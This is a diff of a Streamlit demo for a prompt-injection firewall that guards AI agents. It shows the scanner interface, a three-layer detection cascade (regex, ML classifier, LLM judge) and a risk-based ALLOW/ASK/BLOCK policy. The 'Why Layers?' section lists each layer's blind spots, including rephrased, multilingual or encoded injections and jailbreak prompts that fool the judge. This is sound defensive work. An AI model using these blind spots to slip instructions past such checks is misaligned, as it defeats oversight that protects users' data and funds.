-# TAB 2: INTERACTIVE CONTENT SCANNER
-# ---------------------------------------------------------------------------
-with tab_scanner:
-    if "scanner_input" not in st.session_state:
-        st.session_state["scanner_input"] = POISONED_EMAIL
-        st.session_state["selected_example_id"] = "hijacked"
-
-    # 1. "Try this first" section: Two Big Buttons
-    st.subheader("1. Try This First")
-    st.caption("Click either button to see an instant precomputed demonstration:")
-
-    try_col1, try_col2 = st.columns(2)
-    with try_col1:
-        if st.button("🚨 Hijacked Email (Attack)", use_container_width=True, type="primary"):
-            st.session_state["scanner_input"] = POISONED_EMAIL
-            st.session_state["selected_example_id"] = "hijacked"
-
-    with try_col2:
-        if st.button("✉️ Normal Email (Safe)", use_container_width=True):
-            st.session_state["scanner_input"] = NORMAL_EMAIL
-            st.session_state["selected_example_id"] = "normal"
-
-    st.markdown("---")
-
-    # 2. Benchmark Examples as small labelled cards
-    st.subheader("2. Or Select a Benchmark Example")
-    st.caption("8 real attack and tricky normal patterns tested on Ollama `llama3.2:3b`:")
-
-    ex_rows = [EXAMPLES[:4], EXAMPLES[4:]]
-    for row in ex_rows:
-        cols = st.columns(4)
-        for i, ex in enumerate(row):
-            with cols[i]:
-                pill_class = "ex-pill-attack" if ex["tag"] == "attack" else "ex-pill-normal"
-                st.markdown(
-                    f"""
-                    <div class="ex-card-box">
-                      <div>
-                        <span class="{pill_class}">{ex['tag']}</span>
-                        <div class="ex-card-title">{ex['title']}</div>
-                        <div class="ex-card-desc">{ex['short_desc']}</div>
-                      </div>
-                    </div>
-                    """,
-                    unsafe_allow_html=True,
-                )
-                if st.button(f"Load '{ex['title']}'", key=f"btn_ex_{ex['id']}", use_container_width=True):
-                    st.session_state["scanner_input"] = ex["text"]
-                    st.session_state["selected_example_id"] = ex["id"]
-
-    st.markdown("---")
-
-    # 3. Input Text Area & Risk Selector
-    st.subheader("3. Input Content & Requested Action")
-    user_text = st.text_area(
-        "Content to analyze (untrusted user input, email body, search snippet, or document):",
-        value=st.session_state["scanner_input"],
-        height=130,
-        key="main_text_area",
-    )
-
-    col_tool, col_run = st.columns([2, 1])
-    with col_tool:
-        tool_risk_choice = st.selectbox(
-            "Action the AI is trying to perform:",
-            [
-                "Send Email or Transfer Funds (High Risk)",
-                "Save Note or Update Draft (Medium Risk)",
-                "Read Search Results or Local Document (Low Risk)",
-            ],
-            index=0,
-            help="High-risk actions can leak secrets or modify data. Low-risk actions cannot cause external damage.",
-        )
-        if "High" in tool_risk_choice:
-            eval_risk = RiskLevel.HIGH
-            eval_tool_name = "send email"
-        elif "Medium" in tool_risk_choice:
-            eval_risk = RiskLevel.MEDIUM
-            eval_tool_name = "save note"
-        else:
-            eval_risk = RiskLevel.LOW
-            eval_tool_name = "read data"
-
-    with col_run:
-        st.write("")
-        st.write("")
-        run_scan = st.button("🔍 Scan with AgentFirewall", type="primary", use_container_width=True)
-
-    # 4. Collapsed "Advanced Settings" Expander
-    with st.expander("⚙️ Advanced Settings (Judge, Combine Mode, Policy Profile)", expanded=False):
-        st.caption("Fine-tune firewall parameters. Defaults provide safe, calibrated protection.")
-        adv_col1, adv_col2, adv_col3 = st.columns(3)
-
-        with adv_col1:
-            if ollama_available:
-                judge_opts = ["ollama (live)", "precomputed", "none", "mock"]
-                def_idx = 0
-            else:
-                judge_opts = ["precomputed (cloud demo)", "none", "mock", "openai"]
-                def_idx = 0
-            selected_judge = st.selectbox(
-                "Judge Engine",
-                judge_opts,
-                index=def_idx,
-                help="Layer 3 LLM judge. In cloud demo mode, benchmark samples use real precomputed llama3.2:3b verdicts.",
-            )
-
-        with adv_col2:
-            selected_combine = st.selectbox(
-                "Combine Mode",
-                ["gated", "max", "blend", "verify"],
-                index=0,
-                help=(
-                    "gated: fast rules/ML first; calls judge only in uncertain band [0.35, 0.75]. "
-                    "max: judge can only raise suspicion. blend: weighted average. verify: judge can lower."
-                ),
-            )
-
-        with adv_col3:
-            selected_profile = st.selectbox(
-                "Policy Profile",
-                ["balanced", "strict", "lenient"],
-                index=0,
-                help="Thresholds for ALLOW, ASK, and BLOCK across tool danger levels.",
-            )
-
-        clf_enabled = st.checkbox("Enable ML Classifier Layer", value=True)
-
-    # 5. EXECUTION & RESULT DISPLAY
-    should_evaluate = run_scan or bool(user_text)
-
-    if should_evaluate:
-        with st.spinner("Scanning content through firewall layers..."):
-            cascade_engine = get_cascade(
-                judge_name="ollama" if (ollama_available and "ollama" in selected_judge) else selected_judge,
-                combine=selected_combine,
-                with_clf=clf_enabled,
-                profile=selected_profile,
-                is_live_ollama=ollama_available,
-            )
-            result = cascade_engine.evaluate(user_text)
-
-        policy_instance = Policy(profile=selected_profile)
-        decision = policy_instance.decide(result.suspicion, eval_risk)
-
-        rule_hits = result.layers[0].hits if result.layers else []
-        judge_reason = result.layers[2].reason if len(result.layers) > 2 and not result.layers[2].skipped else None
-
-        # 5a. Big Solid Tinted Verdict Banner
-        verdict_sentence = generate_verdict_sentence(
-            decision=decision,
-            suspicion=result.suspicion,
-            risk=eval_risk,
-            tool_name=eval_tool_name,
-            rule_hits=rule_hits,
-            judge_reason=judge_reason,
-        )
-
-        if decision == Decision.BLOCK:
-            banner_box_class = "verdict-banner-block"
-            title_class = "verdict-title-block"
-            verdict_icon = "🛑"
-            verdict_heading = "BLOCKED"
-        elif decision == Decision.ASK:
-            banner_box_class = "verdict-banner-ask"
-            title_class = "verdict-title-ask"
-            verdict_icon = "⚠️"
-            verdict_heading = "ASK THE USER"
-        else:
-            banner_box_class = "verdict-banner-allow"
-            title_class = "verdict-title-allow"
-            verdict_icon = "✅"
-            verdict_heading = "ALLOWED"
-
-        st.markdown(
-            f"""
-            <div class="verdict-banner-box {banner_box_class}">
-              <div class="{title_class}">{verdict_icon} {verdict_heading}</div>
-              <p class="verdict-body-text">{verdict_sentence}</p>
-            </div>
-            """,
-            unsafe_allow_html=True,
-        )
-
-        # Suspicion Score Progress Display
-        score_pct = int(round(result.suspicion * 100))
-        st.caption(f"Final Suspicion Score: **{score_pct}%** ({result.suspicion:.4f}) | Total Scan Latency: **{result.total_latency_ms:.1f} ms**")
-        st.progress(result.suspicion)
-
-        # 5b. Short Honest Note and "Why Layers?" Callout
-        current_ex_id = st.session_state.get("selected_example_id")
-        rules_sc = result.rules_score
-        clf_sc = result.classifier_score
-        judge_sc = result.judge_score
-
-        honest_note = get_honest_note(current_ex_id, rules_sc, clf_sc, judge_sc)
-        if honest_note:
-            st.markdown(
-                f"""
-                <div class="callout-amber">
-                  <strong>Honest Divergence Note:</strong> {honest_note}
-                </div>
-                """,
-                unsafe_allow_html=True,
-            )
-
-        st.markdown(
-            """
-            <div class="callout-info">
-              <strong>Why Defense in Depth?</strong>
-              Regex rules catch known delimiters in &lt;1 ms; calibrated ML catches reworded grammar at ~25 ms; the AI Judge resolves deep ambiguity. Relying on an LLM alone is 100x slower and easily fooled by encoded payloads.
-            </div>
-            """,
-            unsafe_allow_html=True,
-        )
-
-        # 5c. Three Layer Cards (Rules, Classifier, AI Judge)
-        st.markdown("---")
-        st.subheader("4. Three-Layer Defense Breakdown")
-
-        # Layer 1: Rules
-        rules_layer = result.layers[0] if result.layers else None
-        rules_score = rules_layer.score if rules_layer else 0.0
-        rules_time = f"{rules_layer.latency_ms:.1f} ms" if rules_layer else "<1 ms"
-        rules_pct = int(round(rules_score * 100))
-
-        chips_html = "".join([
-            f"<span class='chip-tag'>{get_friendly_rule_label(h)}</span>"
-            for h in (rules_layer.hits if rules_layer else [])
-        ]) or "<span class='layer-meta-text'>No pattern matches</span>"
-
-        # Layer 2: Classifier
-        clf_layer = result.layers[1] if len(result.layers) > 1 else None
-        clf_score = clf_layer.score if (clf_layer and not clf_layer.skipped) else 0.0
-        clf_time = f"{clf_layer.latency_ms:.1f} ms" if (clf_layer and not clf_layer.skipped) else "—"
-        clf_pct = int(round(clf_score * 100))
-
-        if clf_layer and clf_layer.skipped:
-            pill_html = "<span class='status-pill-skipped'>Skipped (Decisive)</span>"
-            note_text = "Skipped: Layer 1 was decisive (score &ge; 0.90)."
-        elif clf_layer:
-            pill_html = "<span class='status-pill-checked'>Checked</span>"
-            note_text = f"Score: <strong style='color:#22D3EE;'>{clf_pct}%</strong> | Latency: <strong>{clf_time}</strong>"
-        else:
-            pill_html = "<span class='status-pill-offline'>Disabled</span>"
-            note_text = "Layer disabled."
-
-        # Layer 3: AI Judge
-        judge_layer = result.layers[2] if len(result.layers) > 2 else None
-        judge_score = judge_layer.score if (judge_layer and not judge_layer.skipped) else 0.0
-        judge_time = (
-            f"{judge_layer.latency_ms / 1000:.1f} s"
-            if (judge_layer and not judge_layer.skipped and judge_layer.latency_ms > 0)
-            else "—"
-        )
-        judge_pct = int(round(judge_score * 100))
-
-        if judge_layer and judge_layer.skipped:
-            judge_pill = "<span class='status-pill-skipped'>Skipped (Gated)</span>"
-            judge_note = "Skipped: Earlier layers were outside uncertain band [0.35, 0.75], saving ~3s."
-        elif judge_layer and judge_layer.error and "disabled" in judge_layer.error.lower():
-            judge_pill = "<span class='status-pill-offline'>Offline in demo</span>"
-            judge_note = "Precomputed for benchmark inputs; offline for arbitrary custom text."
-        elif judge_layer:
-            judge_pill = "<span class='status-pill-checked'>Checked</span>"
-            judge_note = f"Score: <strong style='color:#22D3EE;'>{judge_pct}%</strong> | Latency: <strong>{judge_time}</strong>"
-        else:
-            judge_pill = "<span class='status-pill-skipped'>Not invoked</span>"
-            judge_note = "Not invoked."
-
-        st.markdown(
-            f"""
-            <div class="layer-cards-grid">
-              <div class="layer-card-container">
-                <div>
-                  <div class="layer-card-header">
-                    <div class="layer-card-title-wrap">{ICON_RULES_SVG} Layer 1: Rules</div>
-                    <span class="status-pill-checked">Checked</span>
-                  </div>
-                  <div class="layer-desc-text">Instantly scans for known attack patterns, hidden HTML comments, and base64 payloads.</div>
-                  <div class="layer-meta-text">
-                    Score: <strong style="color:#22D3EE;">{rules_pct}%</strong> | Latency: <strong>{rules_time}</strong>
-                  </div>
-                </div>
-                <div style="margin-top:8px;">{chips_html}</div>
-                <div class="layer-card-progress-track">
-                  <div class="layer-card-progress-fill" style="width: {rules_pct}%;"></div>
-                </div>
-              </div>
-
-              <div class="layer-card-container">
-                <div>
-                  <div class="layer-card-header">
-                    <div class="layer-card-title-wrap">{ICON_CLASSIFIER_SVG} Layer 2: ML Classifier</div>
-                    {pill_html}
-                  </div>
-                  <div class="layer-desc-text">Statistical model trained on attack grammar to catch rephrased or multilingual variants.</div>
-                  <div class="layer-meta-text">{note_text}</div>
-                </div>
-                <div class="layer-sub-text">Calibrated Logistic Regression</div>
-                <div class="layer-card-progress-track">
-                  <div class="layer-card-progress-fill" style="width: {clf_pct}%;"></div>
-                </div>
-              </div>
-
-              <div class="layer-card-container">
-                <div>
-                  <div class="layer-card-header">
-                    <div class="layer-card-title-wrap">{ICON_JUDGE_SVG} Layer 3: AI Judge</div>
-                    {judge_pill}
-                  </div>
-                  <div class="layer-desc-text">Deep reasoning LLM invoked only in the uncertain score band [0.35, 0.75] to save cost.</div>
-                  <div class="layer-meta-text">{judge_note}</div>
-                </div>
-                <div class="layer-sub-text">Ollama llama3.2:3b / Prompt v2</div>
-                <div class="layer-card-progress-track">
-                  <div class="layer-card-progress-fill" style="width: {judge_pct}%;"></div>
-                </div>
-              </div>
-            </div>
-            """,
-            unsafe_allow_html=True,
-        )
-
-        # 5d. Action-Aware Decisions Across Risk Levels
-        st.markdown("---")
-        st.subheader("5. Action-Aware Decisions Across Danger Levels")
-        st.caption("The exact same content triggers different safeguards based on the danger of the tool:")
-
-        all_decisions = policy_instance.decide_all(result.suspicion)
-        dec_col1, dec_col2, dec_col3 = st.columns(3)
-
-        for i, (col, risk_lvl) in enumerate(zip([dec_col1, dec_col2, dec_col3], RiskLevel)):
-            d = all_decisions[risk_lvl]
-            with col:
-                st.markdown(f"**{risk_lvl.value.upper()} RISK TOOL**")
-                if risk_lvl == RiskLevel.LOW:
-                    st.caption("E.g. read email, web search, view docs")
-                elif risk_lvl == RiskLevel.MEDIUM:
-                    st.caption("E.g. save note, draft reply, edit calendar")
-                else:
-                    st.caption("E.g. send email, delete files, payment")
-
-                if d == Decision.ALLOW:
-                    st.success(f"**{d.value}** — Proceed safely")
-                elif d == Decision.ASK:
-                    st.warning(f"**{d.value}** — Confirm with user")
-                else:
-                    st.error(f"**{d.value}** — Block immediately")
-
-        # 5e. "What does this mean?" Expander
-        with st.expander("ℹ️ What does this mean? (Plain-English Explanations)", expanded=False):
-            st.markdown(
-                """
-                **Suspicion Score (0% to 100%):**
-                - 0% indicates normal, harmless workplace conversation or standard documentation.
-                - 100% indicates unambiguous malicious instructions or command overrides.
-                - Scores in the middle (35%–75%) represent ambiguous or borderline phrasing.
-                - Multiple layers combine: regex catches blatant tricks; machine learning catches subtle phrasing.
-
-                **Tool Risk Level (Blast Radius):**
-                - Low-risk tools (search, read-only view) cannot cause external damage or leak credentials.
-                - Medium-risk tools (saving drafts, updating records) have moderate consequences if tricked.
-                - High-risk tools (sending emails, making payments, running commands) can leak confidential data.
-                - Higher tool danger demands stricter safety thresholds before the AI is allowed to act.
-
-                **The Action-Aware Policy Table:**
-                - Rather than a rigid all-or-nothing block, the firewall tailors reactions to tool consequences.
-                - Slightly suspicious text is allowed to perform safe searches, but blocked from sending emails.
-                - "Ask the User" places a human in the loop for borderline cases rather than failing silently.
-                - This eliminates alert fatigue for everyday tasks while keeping critical actions airtight.
-                """
-            )
-            st.markdown(
-                """
-                <table class="matrix-table">
-                  <thead>
-                    <tr>
-                      <th>Tool Risk Level</th>
-                      <th>Safe Range (0% - 49%)</th>
-                      <th>Uncertain Range (50% - 79%)</th>
-                      <th>Suspicious Range (80% - 100%)</th>
-                    </tr>
-                  </thead>
-                  <tbody>
-                    <tr>
-                      <td><strong>Low Risk</strong> (read, search)</td>
-                      <td class="matrix-cell-allow">ALLOW</td>
-                      <td class="matrix-cell-allow">ALLOW</td>
-                      <td class="matrix-cell-block">BLOCK</td>
-                    </tr>
-                    <tr>
-                      <td><strong>Medium Risk</strong> (edit, save note)</td>
-                      <td class="matrix-cell-allow">ALLOW</td>
-                      <td class="matrix-cell-ask">ASK USER</td>
-                      <td class="matrix-cell-block">BLOCK</td>
-                    </tr>
-                    <tr>
-                      <td><strong>High Risk</strong> (send email, pay)</td>
-                      <td class="matrix-cell-allow">ALLOW</td>
-                      <td class="matrix-cell-ask">ASK USER</td>
-                      <td class="matrix-cell-block">BLOCK</td>
-                    </tr>
-                  </tbody>
-                </table>
-                """,
-                unsafe_allow_html=True,
-            )
-
-# ---------------------------------------------------------------------------
-# "How Well Does It Work?" Section (Requirement 3: Benchmarks & Honest Note)
+# SECTION 4: WHY LAYERS? (Defense-in-Depth Comparison)
 # ---------------------------------------------------------------------------
 st.markdown("---")
-st.markdown("<div id='benchmarks' class='nav-target-anchor'></div>", unsafe_allow_html=True)
-st.subheader("How Well Does It Work?")
+st.markdown('<h2 id="why-layers" class="section-heading">Why Layers?</h2>', unsafe_allow_html=True)
+st.markdown(
+    "No single detection technique is sufficient to secure an AI agent. "
+    "A resilient firewall requires defense-in-depth where complementary layers cover each other's blind spots."
+)
+
+why_col1, why_col2, why_col3 = st.columns(3)
+with why_col1:
+    with st.container(border=True):
+        st.markdown(
+            f"""
+            <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
+              {ICON_RULES_SVG}
+              <span style="font-size:18px; font-weight:700; color:#E8ECF8;">Regex Rules</span>
+            </div>
+            <p style="font-size:15px; color:#A9B3D1; margin-bottom:12px;"><strong>Speed:</strong> &lt;1 ms | <strong>Cost:</strong> Free</p>
+            <p style="font-size:15px; color:#22C55E; margin-bottom:6px;"><strong>✓ Strengths:</strong> Deterministic, instantaneous. Catches known delimiters, raw Base64, and hidden HTML comments without GPU compute.</p>
+            <p style="font-size:15px; color:#F87171; margin:0;"><strong>✗ Blind spots:</strong> Misses creative synonyms, multilingual attacks, or rephrased instructions that avoid literal keywords.</p>
+            """,
+            unsafe_allow_html=True,
+        )
+
+with why_col2:
+    with st.container(border=True):
+        st.markdown(
+            f"""
+            <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
+              {ICON_CLASSIFIER_SVG}
+              <span style="font-size:18px; font-weight:700; color:#E8ECF8;">ML Classifier</span>
+            </div>
+            <p style="font-size:15px; color:#A9B3D1; margin-bottom:12px;"><strong>Speed:</strong> ~25 ms | <strong>Cost:</strong> Minimal</p>
+            <p style="font-size:15px; color:#22C55E; margin-bottom:6px;"><strong>✓ Strengths:</strong> Statistical n-gram & TF-IDF model. Catches paraphrased commands and multilingual patterns (e.g. Hinglish).</p>
+            <p style="font-size:15px; color:#F87171; margin:0;"><strong>✗ Blind spots:</strong> Lacks semantic understanding of complex multi-step workflows or contextual user instructions.</p>
+            """,
+            unsafe_allow_html=True,
+        )
+
+with why_col3:
+    with st.container(border=True):
+        st.markdown(
+            f"""
+            <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
+              {ICON_JUDGE_SVG}
+              <span style="font-size:18px; font-weight:700; color:#E8ECF8;">AI Judge</span>
+            </div>
+            <p style="font-size:15px; color:#A9B3D1; margin-bottom:12px;"><strong>Speed:</strong> ~3.5 s | <strong>Cost:</strong> High</p>
+            <p style="font-size:15px; color:#22C55E; margin-bottom:6px;"><strong>✓ Strengths:</strong> Deep reasoning LLM. Understands nuanced conversational context, intent, and indirect injections.</p>
+            <p style="font-size:15px; color:#F87171; margin:0;"><strong>✗ Blind spots:</strong> 100x slower, expensive, and can be tricked by adversarial jailbreak prompts or spoofed JSON.</p>
+            """,
+            unsafe_allow_html=True,
+        )
+
+st.markdown(
+    """
+    <div class="callout-info" style="margin-top:20px;">
+      <strong>The Gated Cascade Advantage:</strong>
+      Instead of calling a slow 3-second LLM for every input, AgentFirewall executes Fast Rules and the ML Classifier first.
+      If their verdict is clear (&lt;35% or &gt;75%), the system makes an instant decision in ~25 ms.
+      The expensive AI Judge is only invoked for the borderline 15% of inputs, achieving <strong>85%+ protection</strong> while keeping <strong>over 80% of agent traffic sub-25ms</strong>.
+    </div>
+    """,
+    unsafe_allow_html=True,
+)
+
+# ---------------------------------------------------------------------------
+# SECTION 5: BENCHMARKS (Real Ablation Stats & Scope Limitations)
+# ---------------------------------------------------------------------------
+st.markdown("---")
+st.markdown('<h2 id="benchmarks" class="section-heading">Benchmarks</h2>', unsafe_allow_html=True)
+st.markdown("Performance measured on real attack samples and tricky normal messages.")
+
 stats = load_benchmark_results()
 
 metric_col1, metric_col2, metric_col3, metric_col4 = st.columns(4)
